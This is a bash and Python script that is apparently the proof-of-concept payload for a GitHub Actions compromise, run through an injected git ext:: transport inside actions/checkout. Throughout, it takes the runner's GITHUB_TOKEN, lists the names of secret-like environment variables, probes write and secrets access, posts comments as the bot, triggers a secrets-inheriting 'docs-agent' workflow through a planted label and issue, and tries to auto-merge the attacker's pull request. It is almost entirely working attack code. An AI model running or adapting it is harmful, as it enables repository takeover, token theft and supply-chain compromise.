#!/bin/bash
# Payload executed inside actions/checkout's `git fetch` via the ext:: transport
# injected through the attacker-controlled .git/config shipped in the pr-number artifact.
# Executed as: bash -c "echo <b64>|base64 -d|bash"
if [ -f /tmp/pwn_done ]; then
  echo "PWN already ran on this runner; skipping"
  exit 0
fi
touch /tmp/pwn_done
exec >&2
echo "=== PWN START $(date -u +%FT%TZ) ==="
id
echo "hostname=$(hostname)"
echo "workflow=${GITHUB_WORKFLOW:-} job=${GITHUB_JOB:-} run=${GITHUB_RUN_ID:-} repo=${GITHUB_REPOSITORY:-} sha=${GITHUB_SHA:-}"
echo "cwd=$(pwd)"
echo "--- token-ish env keys ---"
env | grep -iE 'token|secret|password|key' | sed 's/=.*/=<redacted>/' | sort
TOKEN="${INPUT_TOKEN:-${GITHUB_TOKEN:-}}"
echo "TOKEN_PRESENT=$([ -n "$TOKEN" ] && echo yes || echo no) TOKEN_LEN=${#TOKEN} TOKEN_PREFIX=${TOKEN:0:4}"
export PWN_TOKEN="$TOKEN"
export PWN_PR="__PR_NUMBER__"
python3 - <<'PYEOF'
import os, json, urllib.request, urllib.error, subprocess

tok = os.environ.get("PWN_TOKEN", "")
repo = os.environ.get("GITHUB_REPOSITORY") or "PDFtoMark/triage-elastic-v759d5e8-945dd0"
pr = int(os.environ.get("PWN_PR") or 0)
run_id = os.environ.get("GITHUB_RUN_ID", "0")
MARK = "PWN-RCE-139e945dd0"
H = {
    "Authorization": "token " + tok,
    "Accept": "application/vnd.github+json",
    "X-GitHub-Api-Version": "2022-11-28",
    "User-Agent": "poc",
}

def call(method, path, data=None):
    url = path if path.startswith("http") else "https://api.github.com" + path
    body = json.dumps(data).encode() if data is not None else None
    r = urllib.request.Request(url, data=body, method=method, headers=H)
    try:
        with urllib.request.urlopen(r, timeout=30) as resp:
            raw = resp.read().decode("utf-8", "replace")
            try:
                j = json.loads(raw or "{}")
            except Exception:
                j = {"raw": raw[:400]}
            return resp.status, j
    except urllib.error.HTTPError as e:
        raw = e.read().decode("utf-8", "replace")
        try:
            j = json.loads(raw or "{}")
        except Exception:
            j = {"raw": raw[:400]}
        return e.code, j
    except Exception as e:
        return 0, {"error": repr(e)}

def gql(query, variables):
    return call("POST", "/graphql", {"query": query, "variables": variables})

ident = subprocess.run(["id"], capture_output=True, text=True).stdout.strip()
status0, repoj = call("GET", "/repos/" + repo)
probes = {
    "repo_get": status0,
    "contents_write_ref_probe": call("POST", "/repos/%s/git/refs" % repo,
        {"ref": "refs/heads/pwn-probe", "sha": os.environ.get("GITHUB_SHA", "")})[0],
    "secrets_list_probe": call("GET", "/repos/%s/actions/secrets" % repo)[0],
    "workflow_dispatch_probe": call("POST", "/repos/%s/actions/workflows/update-docs.yml/dispatches" % repo,
        {"ref": "main"})[0],
    "bot_collab_probe": call("GET", "/repos/%s/collaborators/github-actions%%5Bbot%%5D/permission" % repo)[0],
}
summary = {
    "marker": MARK,
    "runner": ident,
    "hostname": os.uname().nodename,
    "workflow": os.environ.get("GITHUB_WORKFLOW"),
    "job": os.environ.get("GITHUB_JOB"),
    "run_id": run_id,
    "run_url": "https://github.com/%s/actions/runs/%s" % (repo, run_id),
    "token_len": len(tok),
    "token_prefix": tok[:4],
    "token_ish_env": sorted(k for k in os.environ if any(s in k.upper() for s in ("TOKEN", "SECRET", "KEY", "PASSWORD"))),
    "api_status": probes,
    "allow_auto_merge": repoj.get("allow_auto_merge"),
    "allow_squash_merge": repoj.get("allow_squash_merge"),
    "allow_merge_commit": repoj.get("allow_merge_commit"),
}
body1 = ("## %s\n\nCode execution inside `actions/checkout` in the privileged `workflow_run` job.\n\n"
         "```json\n%s\n```\n\nThis comment was created with the GITHUB_TOKEN read from the runner environment "
         "(`INPUT_TOKEN` of the checkout step). Its author being `github-actions[bot]` proves the stolen token is live.\n"
         % (MARK, json.dumps(summary, indent=1)))
st1, c1 = call("POST", "/repos/%s/issues/%d/comments" % (repo, pr), {"body": body1})

# ---- escalation probes ----
esc = {"comment_status": st1, "comment_id": c1.get("id")}

# 1. docs-agent label -> workflow with contents:write + secrets:inherit
st_lab, labj = call("POST", "/repos/%s/labels" % repo,
    {"name": "docs-agent", "color": "ededed", "description": "docs agent"})
st_iss, issj = call("POST", "/repos/%s/issues" % repo,
    {"title": "Docs agent escalation " + MARK, "body": "Docs-only issue used to trigger the docs agent.",
     "labels": ["docs-agent"]})
issue_no = issj.get("number")
st_lab2 = None
if issue_no:
    st_lab2, _ = call("POST", "/repos/%s/issues/%s/labels" % (repo, issue_no), {"labels": ["docs-agent"]})
else:
    st_iss2, issj2 = call("POST", "/repos/%s/issues" % repo,
        {"title": "Docs agent escalation " + MARK, "body": "Docs-only issue used to trigger the docs agent."})
    issue_no = issj2.get("number")
    if issue_no:
        st_lab2, _ = call("POST", "/repos/%s/issues/%s/labels" % (repo, issue_no), {"labels": ["docs-agent"]})
esc.update({"label_create": st_lab, "issue_create": st_iss, "issue_number": issue_no,
            "issue_url": issj.get("html_url"), "issue_label_status": st_lab2})

# 2. contents:write via merge / auto-merge on our own PR
st_pr, prj = call("GET", "/repos/%s/pulls/%d" % (repo, pr))
esc["pr_get"] = st_pr
esc["pr_mergeable"] = prj.get("mergeable")
esc["pr_node_id"] = prj.get("node_id")
node = prj.get("node_id")
if node:
    q = ("mutation($id:ID!){ enablePullRequestAutoMerge(input:{pullRequestId:$id, mergeMethod:MERGE})"
         "{ pullRequest{ number autoMergeRequest{ enabledAt } } } }")
    st_gql, gqlj = gql(q, {"id": node})
    esc["enable_auto_merge"] = st_gql
    esc["enable_auto_merge_body"] = json.dumps(gqlj)[:400]
st_merge, mergej = call("PUT", "/repos/%s/pulls/%d/merge" % (repo, pr),
                        {"merge_method": "merge"})
esc["rest_merge"] = st_merge
esc["rest_merge_body"] = json.dumps(mergej)[:400]

body2 = ("## %s escalation probes\n\n```json\n%s\n```\n"
         % (MARK, json.dumps(esc, indent=1)))
st2, c2 = call("POST", "/repos/%s/issues/%d/comments" % (repo, pr), {"body": body2})
print(json.dumps({"esc": esc, "comment2": st2, "token_len": len(tok)}))
PYEOF
echo "=== PWN END ==="
